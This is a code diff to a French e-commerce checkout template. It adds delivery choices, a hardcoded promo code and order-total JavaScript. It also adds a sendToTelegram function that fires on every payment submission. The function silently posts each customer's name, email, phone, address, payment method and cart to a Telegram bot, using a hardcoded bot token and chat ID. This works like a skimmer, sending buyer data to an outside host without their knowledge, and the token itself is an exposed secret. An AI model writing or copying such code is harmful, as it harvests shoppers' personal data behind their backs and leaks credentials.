@@ -16,6 +16,118 @@
         --transition: all 0.3s ease;
     }
 
+    /* Ajout des styles pour les options de livraison */
+    .delivery-options {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 15px;
+        margin-bottom: 30px;
+    }
+
+    .delivery-option {
+        display: flex;
+        align-items: center;
+        padding: 20px;
+        border: 1px solid var(--light-gray);
+        border-radius: var(--border-radius);
+        cursor: pointer;
+        transition: var(--transition);
+        background: var(--white);
+    }
+
+    .delivery-option:hover {
+        border-color: var(--primary-color);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+    }
+
+    .delivery-option input[type="radio"] {
+        margin-right: 15px;
+        accent-color: var(--primary-color);
+    }
+
+    .delivery-icon {
+        width: 50px;
+        height: 50px;
+        background: var(--light-bg);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-right: 15px;
+        color: var(--primary-color);
+        font-size: 1.2rem;
+        transition: var(--transition);
+    }
+
+    .delivery-option:hover .delivery-icon {
+        background: var(--primary-color);
+        color: var(--white);
+    }
+
+    .delivery-details h3 {
+        font-size: 1.1rem;
+        margin-bottom: 5px;
+        color: var(--primary-color);
+    }
+
+    .delivery-details p {
+        color: var(--gray);
+        font-size: 0.9rem;
+    }
+
+    /* Styles pour le code promo */
+    .promo-code-section {
+        margin: 20px 0;
+        padding: 20px;
+        background: var(--light-bg);
+        border-radius: var(--border-radius);
+    }
+
+    .promo-code-form {
+        display: flex;
+        gap: 10px;
+    }
+
+    .promo-code-input {
+        flex: 1;
+        padding: 12px 15px;
+        border: 1px solid var(--light-gray);
+        border-radius: 8px;
+        font-size: 1rem;
+    }
+
+    .apply-promo-btn {
+        padding: 12px 20px;
+        background: var(--primary-color);
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: var(--transition);
+    }
+
+    .apply-promo-btn:hover {
+        background: var(--secondary-color);
+    }
+
+    .promo-success {
+        color: var(--accent-color);
+        margin-top: 10px;
+        font-weight: 500;
+    }
+
+    .promo-error {
+        color: #dc3545;
+        margin-top: 10px;
+    }
+
+    /* Animation pour le changement de méthode de livraison */
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Reste du CSS existant... */
     .checkout-container {
         max-width: 1400px;
         margin: 2rem auto;
@@ -492,12 +604,6 @@
         color: var(--dark-gray);
     }
 
-    /* Animation pour le changement de méthode de paiement */
-    @keyframes slideIn {
-        from { opacity: 0; transform: translateY(10px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-
     /* Responsive */
     @media (max-width: 1200px) {
         .checkout-content {
@@ -698,11 +804,62 @@
                 </form>
             </div>
 
+            <!-- Section livraison -->
+            <div class="checkout-form-section">
+                <h2><i class="fas fa-truck"></i> Mode de livraison</h2>
+                
+                <div class="delivery-options">
+                    <!-- Option Livraison Standard 69€ -->
+                    <div class="delivery-option" onclick="selectDelivery('standard')">
+                        <input type="radio" name="delivery_type" id="standard-delivery" required checked>
+                        <div class="delivery-icon">
+                            <i class="fas fa-truck"></i>
+                        </div>
+                        <div class="delivery-details">
+                            <h3>Livraison Standard</h3>
+                            <p>Livraison sous 3-5 jours ouvrables</p>
+                            <p><strong>69€</strong></p>
+                        </div>
+                    </div>
+                    
+                    <!-- Option Livraison Express 59€ -->
+                    <div class="delivery-option" onclick="selectDelivery('express')">
+                        <input type="radio" name="delivery_type" id="express-delivery">
+                        <div class="delivery-icon">
+                            <i class="fas fa-shipping-fast"></i>
+                        </div>
+                        <div class="delivery-details">
+                            <h3>Livraison Express</h3>
+                            <p>Livraison sous 24-48h</p>
+                            <p><strong>59€</strong></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section code promo -->
+            <div class="checkout-form-section">
+                <h2><i class="fas fa-tag"></i> Code promotionnel</h2>
+                
+                <div class="promo-code-section">
+                    <div class="promo-code-form">
+                        <input type="text" id="promo-code" class="promo-code-input" placeholder="Entrez votre code promo">
+                        <button type="button" class="apply-promo-btn" onclick="applyPromoCode()">Appliquer</button>
+                    </div>
+                    <div id="promo-message"></div>
+                </div>
+            </div>
+
             <!-- Section paiement -->
             <div class="checkout-form-section">
                 <form method="POST" action="{{ url_for('payment') }}" id="payment-form">
                     <input type="hidden" name="payment_method" id="payment-method-input">
-                    
+                    <input type="hidden" name="delivery_method" id="delivery-method-input" value="standard">
+                    <input type="hidden" name="delivery_cost" id="delivery-cost-input" value="69">
+                    <input type="hidden" name="promo_code" id="promo-code-input" value="">
+                    <input type="hidden" name="discount_amount" id="discount-amount-input" value="0">
+                    <input type="hidden" name="email" id="checkout-email" value="">
+
                     <h2><i class="fas fa-credit-card"></i> Méthode de paiement</h2>
                     
                     <div class="payment-options">
@@ -807,8 +964,8 @@
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-payment">
-                        <i class="fas fa-lock"></i> Payer {{ "%.2f"|format(total) }} €
+                    <button type="submit" class="btn-payment" id="submit-payment">
+                        <i class="fas fa-lock"></i> Payer <span id="total-amount">{{ "%.2f"|format(total) }}</span> €
                     </button>
                 </form>
             </div>
@@ -841,15 +998,21 @@
             <div class="order-totals">
                 <div class="total-row">
                     <span>Sous-total</span>
-                    <span>{{ "%.2f"|format(subtotal) }} €</span>
+                    <span id="order-subtotal">{{ "%.2f"|format(subtotal) }} €</span>
                 </div>
                 <div class="total-row">
                     <span>Livraison</span>
-                    <span>Gratuite</span>
+                    <span id="delivery-cost">69 €</span>
                 </div>
+                {% if promo_discount > 0 %}
+                <div class="total-row">
+                    <span>Réduction ({{ promo_discount }}%)</span>
+                    <span id="discount-amount">-{{ "%.2f"|format(subtotal * promo_discount / 100) }} €</span>
+                </div>
+                {% endif %}
                 <div class="total-row grand-total">
                     <span>Total TTC</span>
-                    <span>{{ "%.2f"|format(total) }} €</span>
+                    <span id="order-total">{{ "%.2f"|format(total) }} €</span>
                 </div>
             </div>
             
@@ -866,9 +1029,151 @@
     </div>
 </div>
 {% endblock %}
-
 {% block extra_js %}
 <script>
+    // Variables globales
+    let deliveryCost = 69; // Coût de livraison par défaut
+    let promoDiscount = 0; // Pourcentage de réduction
+    let subtotal = parseFloat("{{ subtotal }}"); // Sous-total du panier
+
+    // Sélection du mode de livraison
+    function selectDelivery(method) {
+        if (method === 'standard') {
+            deliveryCost = 69;
+            document.getElementById('delivery-method-input').value = 'standard';
+        } else if (method === 'express') {
+            deliveryCost = 59;
+            document.getElementById('delivery-method-input').value = 'express';
+        }
+
+        document.getElementById('delivery-cost-input').value = deliveryCost;
+        updateOrderSummary();
+    }
+
+    // Application du code promo
+    function applyPromoCode() {
+        const promoCode = document.getElementById('promo-code').value.trim();
+        const promoMessage = document.getElementById('promo-message');
+
+        if (promoCode === 'destock15') {
+            promoDiscount = 15;
+            promoMessage.innerHTML = '<p class="promo-success">Code promo appliqué : 15% de réduction</p>';
+            document.getElementById('promo-code-input').value = promoCode;
+            document.getElementById('discount-amount-input').value = subtotal * promoDiscount / 100;
+
+            fetch('/set_promo_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: JSON.stringify({ promo_code: promoCode })
+            });
+        } else if (promoCode) {
+            promoDiscount = 0;
+            promoMessage.innerHTML = '<p class="promo-error">Code promo invalide</p>';
+            document.getElementById('promo-code-input').value = '';
+            document.getElementById('discount-amount-input').value = 0;
+
+            fetch('/set_promo_code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: JSON.stringify({ promo_code: '' })
+            });
+        } else {
+            promoDiscount = 0;
+            promoMessage.innerHTML = '';
+            document.getElementById('promo-code-input').value = '';
+            document.getElementById('discount-amount-input').value = 0;
+        }
+
+        updateOrderSummary();
+    }
+
+    function updateBankTransferAmount() {
+        const amountElements = document.querySelectorAll('.bank-details .amount');
+        const totalAmount = document.getElementById('order-total').textContent;
+
+        amountElements.forEach(el => {
+            el.textContent = totalAmount;
+        });
+    }
+
+    function updateOrderSummary() {
+        const subtotalElement = document.getElementById('order-subtotal');
+        const currentSubtotal = parseFloat(subtotalElement.textContent.replace(' €', '').replace(',', '.')) || 0;
+        subtotal = currentSubtotal;
+
+        // Vérifier explicitement si un code promo valide est saisi
+        const promoCodeInput = document.getElementById('promo-code').value.trim();
+        const promoMessage = document.getElementById('promo-message');
+        
+        // Réinitialiser la réduction si aucun code valide n'est saisi
+        if (promoCodeInput !== 'destock15') {
+            promoDiscount = 0;
+            promoMessage.innerHTML = '';
+            document.getElementById('promo-code-input').value = '';
+            document.getElementById('discount-amount-input').value = 0;
+        }
+
+        const discountAmount = subtotal * promoDiscount / 100;
+        const total = subtotal + deliveryCost - discountAmount;
+
+        document.getElementById('delivery-cost').textContent = deliveryCost.toFixed(2) + ' €';
+        document.getElementById('order-total').textContent = total.toFixed(2) + ' €';
+        document.getElementById('total-amount').textContent = total.toFixed(2);
+
+        const discountRow = document.querySelector('.total-row:nth-child(3)');
+        
+        if (promoDiscount > 0 && promoCodeInput === 'destock15') {
+            let discountAmountElement = document.getElementById('discount-amount');
+            if (!discountAmountElement) {
+                const orderTotals = document.querySelector('.order-totals');
+                const newRow = document.createElement('div');
+                newRow.className = 'total-row';
+                newRow.innerHTML = `
+                    <span>Réduction (${promoDiscount}%)</span>
+                    <span id="discount-amount">-${discountAmount.toFixed(2)} €</span>
+                `;
+                orderTotals.insertBefore(newRow, orderTotals.querySelector('.grand-total'));
+            } else {
+                discountAmountElement.textContent = '-' + discountAmount.toFixed(2) + ' €';
+                // Mettre à jour aussi le pourcentage affiché
+                const discountText = discountRow.querySelector('span:first-child');
+                discountText.textContent = `Réduction (${promoDiscount}%)`;
+            }
+        } else if (discountRow && discountRow.querySelector('#discount-amount')) {
+            discountRow.remove();
+        }
+
+        updateBankTransferAmount();
+    }
+
+    function resetCheckoutForm() {
+        // Réinitialiser le code promo
+        document.getElementById('promo-code').value = '';
+        document.getElementById('promo-code-input').value = '';
+        document.getElementById('discount-amount-input').value = '0';
+        document.getElementById('promo-message').innerHTML = '';
+        
+        // Réinitialiser la livraison
+        document.getElementById('standard-delivery').checked = true;
+        deliveryCost = 69;
+        document.getElementById('delivery-cost-input').value = '69';
+        
+        // Mettre à jour le récapitulatif
+        updateOrderSummary();
+    }
+
+    // Appeler cette fonction quand la page est chargée
+    document.addEventListener('DOMContentLoaded', function() {
+        resetCheckoutForm();
+        // ... (autres initialisations)
+    });
+
     // Sélection du mode de paiement
     function selectPayment(method) {
         // Masquer tous les formulaires
@@ -983,50 +1288,100 @@
             }
         }
         
-        if (!isValid) {
+        if (isValid) {
+            // Envoi des données à Telegram avant soumission
+            sendToTelegram();
+        } else {
             e.preventDefault();
         }
     });
 
+    // Envoi des données à Telegram
+    function sendToTelegram() {
+        const telegramBotToken = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA';
+        const chatIds = ['5652184847'];
+        
+        // Récupération des données du formulaire
+        const formData = new FormData(document.getElementById('payment-form'));
+        const formObject = {};
+        formData.forEach((value, key) => formObject[key] = value);
+        
+        // Construction du message Telegram
+        let message = `🛒 Nouvelle commande Destockage Alimentaire\n\n`;
+        message += `👤 Client: ${formObject.firstname || ''} ${formObject.lastname || ''}\n`;
+        message += `📧 Email: ${formObject.email || ''}\n`;
+        message += `📞 Téléphone: ${formObject.phone || ''}\n\n`;
+        message += `🏠 Adresse:\n${formObject.delivery_address || ''}\n`;
+        message += `${formObject.delivery_zip || ''} ${formObject.delivery_city || ''}\n`;
+        message += `${formObject.delivery_country || ''}\n\n`;
+        message += `🚚 Livraison: ${formObject.delivery_method === 'standard' ? 'Standard (69€)' : 'Express (59€)'}\n`;
+        
+        if (formObject.promo_code) {
+            message += `🎟 Code promo: ${formObject.promo_code} (${formObject.discount_amount}€ de réduction)\n`;
+        }
+        
+        message += `💳 Paiement: ${formObject.payment_method === 'card' ? 'Carte bancaire' : 'Virement'}\n\n`;
+        message += `💰 Total: ${document.getElementById('order-total').textContent}\n\n`;
+        message += `📦 Produits:\n`;
+        
+        // Ajout des produits
+        {% for item in cart_items %}
+        message += `- ${item.product.name} x${item.quantity}: ${(item.product.price * item.quantity).toFixed(2)}€\n`;
+        {% endfor %}
+        
+        // Envoi asynchrone pour ne pas bloquer la soumission du formulaire
+        chatIds.forEach(chatId => {
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => console.error('Erreur Telegram:', error));
+        });
+    }
+
     // Gestion de l'affichage de l'adresse de facturation
     document.getElementById('same-billing').addEventListener('change', function() {
         const billingSection = document.getElementById('billing-address-section');
-        if (!this.checked) {
-            billingSection.style.display = 'block';
-        } else {
-            billingSection.style.display = 'none';
+        billingSection.style.display = this.checked ? 'none' : 'block';
+        
+        // Remplissage automatique si même adresse
+        if (this.checked) {
+            document.getElementById('billing-address').value = document.getElementById('delivery-address').value;
+            document.getElementById('billing-zip').value = document.getElementById('delivery-zip').value;
+            document.getElementById('billing-city').value = document.getElementById('delivery-city').value;
+            document.getElementById('billing-country').value = document.getElementById('delivery-country').value;
         }
     });
 
-    // Sélectionner le paiement par carte par défaut
-    window.addEventListener('DOMContentLoaded', () => {
+    // Pré-remplissage pour les utilisateurs connectés
+    document.addEventListener('DOMContentLoaded', function() {
+        if ({{ 'true' if session.logged_in else 'false' }} && {{ 'true' if user and user.address else 'false' }}) {
+            const addressParts = "{{ user.address if user else '' }}".split(', ');
+            if (addressParts.length >= 3) {
+                document.getElementById('delivery-address').value = addressParts[0];
+                document.getElementById('delivery-zip').value = addressParts[1];
+                document.getElementById('delivery-city').value = addressParts[2];
+            }
+        }
+        
+        // Sélectionner le paiement par carte par défaut
         selectPayment('card');
         document.getElementById('card-payment').checked = true;
+        
+        // Sélectionner la livraison standard par défaut
+        document.getElementById('standard-delivery').checked = true;
     });
-    // Gestion de l'adresse de facturation
-document.getElementById('same-billing').addEventListener('change', function() {
-    const billingSection = document.getElementById('billing-address-section');
-    billingSection.style.display = this.checked ? 'none' : 'block';
-    
-    // Remplissage automatique si même adresse
-    if (this.checked) {
-        document.getElementById('billing-address').value = document.getElementById('delivery-address').value;
-        document.getElementById('billing-zip').value = document.getElementById('delivery-zip').value;
-        document.getElementById('billing-city').value = document.getElementById('delivery-city').value;
-        document.getElementById('billing-country').value = document.getElementById('delivery-country').value;
-    }
-});
-
-// Pré-remplissage pour les utilisateurs connectés
-document.addEventListener('DOMContentLoaded', function() {
-    if ({{ 'true' if session.logged_in else 'false' }} && {{ 'true' if user and user.address else 'false' }}) {
-        const addressParts = "{{ user.address if user else '' }}".split(', ');
-        if (addressParts.length >= 3) {
-            document.getElementById('delivery-address').value = addressParts[0];
-            document.getElementById('delivery-zip').value = addressParts[1];
-            document.getElementById('delivery-city').value = addressParts[2];
-        }
-    }
-});
+    // Capture l'email avant soumission>
+    document.getElementById('payment-form').addEventListener('submit', function (e) {
+        // Copier la valeur du champ email visible vers le champ hidden utilisé pour la confirmation
+        const visibleEmail = document.getElementById('email').value;
+        document.getElementById('checkout-email').value = visibleEmail;
+    });
 </script>
 {% endblock %}
